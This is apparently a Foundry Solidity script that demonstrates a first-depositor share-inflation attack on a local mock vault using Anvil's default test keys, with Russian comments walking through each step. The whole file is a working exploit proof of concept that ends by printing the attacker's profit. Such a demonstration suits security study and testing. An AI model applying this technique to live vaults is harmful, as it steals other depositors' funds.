// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/InflationAttackMock.sol";

contract InflationAttackScript is Script {
    function run() external {
        // Используем стандартные приватные ключи из Anvil (локальный блокчейн)
        uint256 attackerKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        uint256 victimKey = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
        
        address attacker = vm.addr(attackerKey);
        address victim = vm.addr(victimKey);

        console.log("--- SETUP ---");
        console.log("Attacker:", attacker);
        console.log("Victim:", victim);

        // 1. ДЕПЛОЙ КОНТРАКТА
        vm.startBroadcast(attackerKey);
        InflationAttackMock vault = new InflationAttackMock();
        vm.stopBroadcast();
        console.log("Vault deployed at:", address(vault));

        // 2. ЗЛОДЕЙ ДЕЛАЕТ ПЕРВЫЙ ДЕПОЗИТ (1 wei)
        vm.startBroadcast(attackerKey);
        vault.deposit{value: 1}();
        vm.stopBroadcast();
        console.log("Attacker deposited 1 wei");

        // 3. ЗЛОДЕЙ РАЗДУВАЕТ БАЛАНС (10 ETH напрямую)
        // Используем .call, так как .transfer упадет из-за нехватки газа при обновлении state
        vm.startBroadcast(attackerKey);
        (bool success, ) = payable(address(vault)).call{value: 10 ether}("");
        require(success, "Inflation failed");
        vm.stopBroadcast();
        console.log("Attacker inflated vault with 10 ETH");

        // 4. ЖЕРТВА ДЕЛАЕТ ДЕПОЗИТ (5 ETH)
        vm.startBroadcast(victimKey);
        vault.deposit{value: 5 ether}();
        vm.stopBroadcast();
        console.log("Victim deposited 5 ETH");

        // Проверяем баланс шеров жертвы
        uint256 victimShares = vault.balanceOf(victim);
        console.log("Victim shares:", victimShares);

        // 5. ЗЛОДЕЙ ЗАБИРАЕТ ВСЕ ДЕНЬГИ
        uint256 attackerBalanceBefore = attacker.balance;
        
        vm.startBroadcast(attackerKey);
        vault.redeem(1); // У злодея всего 1 шер
        vm.stopBroadcast();
        
        uint256 attackerBalanceAfter = attacker.balance;
        
        console.log("--- RESULT ---");
        console.log("Attacker profit:", attackerBalanceAfter - attackerBalanceBefore);
        console.log("EXPLOIT SUCCESSFUL!");
    }
}
